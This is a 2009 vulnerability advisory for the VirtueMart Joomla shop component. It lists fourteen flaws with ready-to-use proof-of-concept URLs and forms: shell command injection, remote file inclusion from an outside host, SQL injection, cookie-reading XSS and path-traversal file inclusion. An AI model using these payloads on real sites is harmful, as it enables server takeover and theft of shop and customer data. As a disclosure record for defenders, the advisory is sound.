@@ -1,0 +1,477 @@
+Author: Janek Vind "waraxe"
+Date: 24. January 2009
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-71.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+VirtueMart is an Open Source E-Commerce solution to be used together with a
+Content Management System (CMS) called Joomla! (and Mambo). Joomla! and
+VirtueMart are written in PHP and made easy for use in a PHP/MySQL environment.
+
+Homepage: http://virtuemart.net/
+
+VirtueMart Joomla eCommerce Edition is affected by same vulnerabilities.
+
+
+List of found vulnerabilities
+===============================================================================
+
+1. Remote Shell Command Execution in "shop.pdf_output.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: high
+Preconditions:
+1. *nix (non-Windows) server
+2. file "/usr/bin/htmldoc" must exist
+
+Problematic source code:
+-----------------------------------------------------------
+$showpage = vmGet( $_REQUEST, 'showpage');
+...
+if (@file_exists( "/usr/bin/htmldoc" )) {
+
+$load_page = $mosConfig_live_site . "/index2.php?option=com_virtuemart&
+page=$showpage&flypage=$flypage&product_id=$product_id
+&category_id=$category_id&pop=1&hide_js=1&output=pdf";
+...
+passthru( "/usr/bin/htmldoc --no-localfiles --quiet -t pdf14 --jpeg
+--webpage --header t.D --footer ./. --size letter --left 0.5in '$load_page'" );
+-----------------------------------------------------------
+
+As seen from code snippet above, user submitted parameter "showpage"
+is used in unsafe manner without proper sanitization in interaction with
+operating system shell. This vulnerability allows an attacker to execute
+remote shell commands on the target server.
+
+Example attack url:
+
+http://localhost/virtuemart112/index.php?page=shop.pdf_output
+&option=com_virtuemart&showpage=';[shell command]
+
+
+
+2. Remote File Inclusion in "show_image_in_imgtag.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: high
+Preconditions:
+1. register_globals=on
+2. allow_url_fopen=on (PHP < 5.2.0)
+3. allow_url_include=on (PHP >= 5.2.0)
+
+Test:
+
+http://localhost/virtuemart112/components/com_virtuemart/show_image_in_imgtag.php?
+mosConfig_absolute_path=http://www.waraxe.us
+
+
+3. Remote File Inclusion in "export.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: high
+Preconditions:
+1. register_globals=on
+2. allow_url_fopen=on (PHP < 5.2.0)
+3. allow_url_include=on (PHP >= 5.2.0)
+
+Test:
+
+http://localhost/virtuemart112/administrator/components/com_virtuemart/export.php?
+mosConfig_absolute_path=http://www.waraxe.us
+
+
+
+4. Sql Injection in "shop_browse_queries.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: high
+Preconditions: none
+Comments:
+1. This is blind sql injection
+
+Test 1:
+
+http://localhost/virtuemart112/index.php?page=shop.browse
+&option=com_virtuemart&DescOrderBy=waraxe
+
+Result (with Debug mode turned on):
+
+500 - JDatabaseMySQL::query: 1064 - You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the
+right syntax to use near 'waraxe LIMIT 0, 20' at line 11
+
+Test 2:
+
+http://localhost/virtuemart112/index.php?DescOrderBy=
+,BENCHMARK(1000000,MD5(123))&option=com_virtuemart&page=shop.browse
+
+Result: response delay as expected
+
+
+Problematic source code:
+----------------------------------------------
+// Descending or Ascending Order? possible values: [ASC|DESC]
+$DescOrderBy = $vmInputFilter->safeSQL( $vm_mainframe->getUserStateFromRequest
+( "browse{$keyword}{$category_id}{$manufacturer_id}DescOrderBy", 'DescOrderBy', "ASC" ) );
+...
+$q .= "
+ORDER BY $orderbyField $DescOrderBy";
+...
+$list .= $q . " LIMIT $limitstart, " . $limit;
+...
+$db_browse->query( $list );
+----------------------------------------------
+
+Use of "safeSQL()" does not make it secure!
+
+
+
+5. Reflected XSS in "shop.downloads.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions: none
+
+Test:
+
+http://localhost/virtuemart112/index.php?func=downloadRequest&option=com_virtuemart
+&page=shop.downloads&download_id="><script>alert(document.cookie);</script>
+
+
+6. Reflected XSS in "mod_virtuemart_currencies.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+1. Currency Selector module must be enabled
+
+Test:
+
+http://localhost/virtuemart112/?"><script>alert(123);</script>
+
+Problematic source code:
+----------------------------------------------
+if( !empty( $_POST )) {
+foreach( $_POST as $key => $val ) {
+if( $key == 'product_currency' || is_array($val) ) continue;
+$val = htmlspecialchars($val, ENT_QUOTES);
+echo "<input type="hidden" name="$key" value="$val" />
+";
+}
+}
+elseif( !empty( $_GET )) {
+foreach( $_GET as $key => $val ) {
+if( $key == 'product_currency' || is_array($val) ) continue;
+echo "<input type="hidden" name="$key"
+value="".htmlspecialchars($val, ENT_QUOTES)."" />
+";
+}
+}
+----------------------------------------------
+
+
+
+7. Reflected XSS in "notify.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions: none
+
+Test goes through POST, using html like this:
+----------------------------------------------
+<html><body><center>
+<form action="http://localhost/virtuemart112/administrator/
+components/com_virtuemart/notify.php" method="post">
+<input type="hidden" name="waraxe" value=
+"<script>alert(document.cookie);</script>">
+<input type="submit" value="Test!">
+</form>
+</center></body></html>
+----------------------------------------------
+
+
+8. Sql Injection in "mod_virtuemart_manufacturers.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+1. Manufacturers module must be enabled
+2. magic_quotes_gpc=off
+
+Test:
+
+http://localhost/virtuemart112/?category_id=zzz'+UNION+SELECT+1,@@version%23
+
+Problematic source code:
+----------------------------------------------
+$category_id = vmGet( $_REQUEST, 'category_id', '' );
+...
+$query = "SELECT DISTINCT m.manufacturer_id, m.mf_name
+FROM #__{vm}_manufacturer m
+...
+WHERE cx.category_id = '$category_id' ";
+----------------------------------------------
+
+
+9. Local File Inclusion in "store.shipping_module_form.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: low
+Preconditions:
+1. attacker must have VirtueMart administration privileges
+
+Problematic source code:
+----------------------------------------------
+$shipping_module = vmGet($_REQUEST, 'shipping_module', null);
+
+if( $shipping_module ) {
+if( !include( CLASSPATH."shipping/$shipping_module" )) {
+----------------------------------------------
+
+Test:
+
+http://localhost/virtuemart112/administrator/index.php?
+page=store.shipping_module_form&shipping_module=
+../../../../../configuration.php&option=com_virtuemart
+
+Result:
+
+Fatal error: Cannot redeclare class JConfig in
+C:apache_wwwrootvirtuemart112configuration.php on line 2
+
+So it's classical LFI (Local File Inclusion) security vulnerability,
+but it's exploitable only by attacker with admin privileges.
+Therefore security impact can be considered as low.
+
+
+10. Sql Injection in shipping administration
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: low
+Preconditions:
+1. attacker must have Virtuemart administration privileges
+2. magic_quotes_gpc=off
+
+Some examples (actually there are more sql injections)
+--------------------------------------------------------------
+function add(&$d) {
+...
+$q = "INSERT INTO #__{vm}_shipping_carrier
+(shipping_carrier_name, shipping_carrier_list_order) VALUES ('";
+$q .= $d["shipping_carrier_name"] . "','";
+$q .= $d["shipping_carrier_list_order"] . "')";
+...
+function update(&$d) {
+...
+$q = "UPDATE #__{vm}_shipping_carrier SET ";
+$q .= "shipping_carrier_name='" . $d["shipping_carrier_name"];
+$q .= "',shipping_carrier_list_order='" . $d["shipping_carrier_list_order"];
+$q .= "' WHERE shipping_carrier_id='" . $d["shipping_carrier_id"]."'";
+...
+function delete_record( $record_id, &$d ) {
+...
+$q = "DELETE FROM #__{vm}_shipping_carrier WHERE
+shipping_carrier_id='$record_id'";
+$db->query($q);
+--------------------------------------------------------------
+
+Test 1:
+
+1. open "Shipper edit/create form:
+http://localhost/virtuemart112/administrator/index.php?pshop_mode=admin&
+page=shipping.carrier_form&option=com_virtuemart
+
+2. Insert this test string to "Shipper Company" input: war'axe
+
+Result: 500 - An error has occurred.
+
+JDatabaseMySQL::query: 1064 - You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the right syntax
+to use near 'axe','')' at line 1 SQL=INSERT INTO jos_vm_shipping_carrier
+(shipping_carrier_name, shipping_carrier_list_order) VALUES ('war'axe','')
+
+Test 2 (vmtoken must be valid):
+
+1. http://localhost/virtuemart112/administrator/index.php?page=shipping.carrier_list&
+func=carrierDelete&shipping_carrier_id=war%27axe&keyword=&limitstart=0
+&no_menu=0&option=com_virtuemart&vmtoken=2c807c5076c5504fb3c3b5bfea415103
+
+Result:
+500 - An error has occurred.
+
+JDatabaseMySQL::query: 1064 - You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the right syntax to
+use near 'axe'' at line 1 SQL=SELECT shipping_rate_carrier_id FROM
+jos_vm_shipping_rate WHERE shipping_rate_carrier_id='war'axe'
+
+
+11. Disk Space Exhaustion in "show_image_in_imgtag.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: low
+Preconditions: none
+
+Tests:
+
+http://localhost/virtuemart112/components/com_virtuemart/show_image_in_imgtag.php?
+filename=Aple_iPod_Nano_3_47cba5d6971f9.gif&newxsize=2000&newysize=2000
+
+http://localhost/virtuemart112/components/com_virtuemart/show_image_in_imgtag.php?
+filename=Aple_iPod_Nano_3_47cba5d6971f9.gif&newxsize=1999&newysize=2000
+
+http://localhost/virtuemart112/components/com_virtuemart/show_image_in_imgtag.php?
+filename=Aple_iPod_Nano_3_47cba5d6971f9.gif&newxsize=1998&newysize=2000
+
+After tests it can be found, that directory
+"components/com_virtuemart/shop_image/product/resized/" contains resized
+images according to previous test requests. As filesize of images can be
+>1MB per file, then it's easy to make thousands of specially crafted requests
+and waste server's disk space till quota is exceeded. No authentication
+needed, no other mitigating factors.
+
+
+12. Sql Injection in "shop.feed.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: low
+Preconditions: none
+
+
+Test URL:
+http://localhost/virtuemart112/index.php?page=shop.feed&option=com_virtuemart
+&limit=1waraxe
+
+Resulting error message (with debug turned on):
+
+500 - JDatabaseMySQL::query: 1064 - You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the right syntax to use
+near '1waraxe' at line 7 SQL=SELECT DISTINCT(product_sku), p.product_id, product_name,
+product_thumb_image, product_s_desc as description, p.cdate, p.mdate, c.category_name,
+c.category_id, category_flypage FROM jos_vm_product p, jos_vm_category c,
+jos_vm_product_category_xref cx WHERE product_publish = 'Y' AND product_parent_id='0'
+AND c.category_id = cx.category_id AND cx.product_id = p.product_id
+ORDER BY mdate DESC LIMIT 0, 1waraxe
+
+As sql injection occurs in LIMIT part of the query, then probably
+it's not exploitable in current situation.
+
+
+13. Reflected XSS and hash disclosure in "shop.debug.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+1. Victim must be logged in as user
+
+
+Test URL:
+
+http://localhost/virtuemart112/index.php?page=shop.debug&option=com_virtuemart
+&Itemid=64&<script>alert(123);</script>
+
+Test shows, that we have classic Reflected XSS case. But this
+is not all :)
+Let's log in as user and then issue request:
+
+http://localhost/virtuemart112/index.php?page=shop.debug&option=com_virtuemart
+&Itemid=64
+
+Resulting debug page has "Global Variables" tab, let's click it.
+Wow ... we can see password's hash and salt:
+
+[user] => JUser Object
+(
+[id] => 62
+[name] => test
+[username] => test
+[email] => *****@yahoo.com
+[password] => 0c90b********bbf4:ISug*****6YN9Yg
+[password_clear] =>
+
+There is no need for such information disclosure! In combination
+with Reflected XSS, shown before, attacker is able to steal victim's
+password hash and salt.
+
+Suggestion - removing sensitive information from debug page.
+
+
+14. Sql Injection in "product.product_move.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: low
+Preconditions:
+1. attacker must have VirtueMart administration privileges
+
+Problematic source code:
+----------------------------------------------------------------
+$products = vmGet( $_POST, 'product_id' );
+$count= count( $products );
+...
+for( $i=0; $i < $count; $i++ ) {
+$products[$i] = intval($products[$i]);
+...
+$db->query( 'SELECT `product_name` FROM `#__{vm}_product` WHERE `product_id`
+IN('.implode(',', $products).') ORDER BY `product_name`');
+----------------------------------------------------------------
+
+At first glance it seems to be secure code because of "intval()".
+But what happens in case of arrays with non-numeric indexes? Example:
+
+product_id[w] = waraxe
+
+Testing is possible via POST request, so special html file is needed:
+----------------------------------------------------------------
+<html><body><center>
+<form action="http://localhost/virtuemart112/administrator/index.php?
+option=com_virtuemart" method="post">
+<input type="hidden" name="pshop_mode" value="admin">
+<input type="hidden" name="page" value="product.product_move">
+<input type="hidden" name="product_id[w]" value="waraxe">
+<input type="submit" value="Test!">
+</form>
+</center></body></html>
+-----------------------------------------------------------------
+
+Resulting error message (debugging is enabled):
+
+JDatabaseMySQL::query: 1054 - Unknown column 'waraxe' in 'where clause'
+SQL=SELECT `product_name` FROM `jos_vm_product` WHERE `product_id`
+IN(waraxe,0) ORDER BY `product_name`
+
+
+How to fix:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Upgrade to new version 1.1.3 ASAP
+
+
+Disclosure Timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+11/27/08 Developer contacted
+11/27/08 Developer's initial response
+11/28/08 Fidings sent to developer
+01/22/09 Patched version 1.1.3 released by developer
+01/24/09 Public disclosure
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,
+to all active waraxe.us forum members and to anyone else who know me!
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum: http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+---------------------------------- [ EOF ] ---------------------------------
+
+# milw0rm.com [2009-03-31]
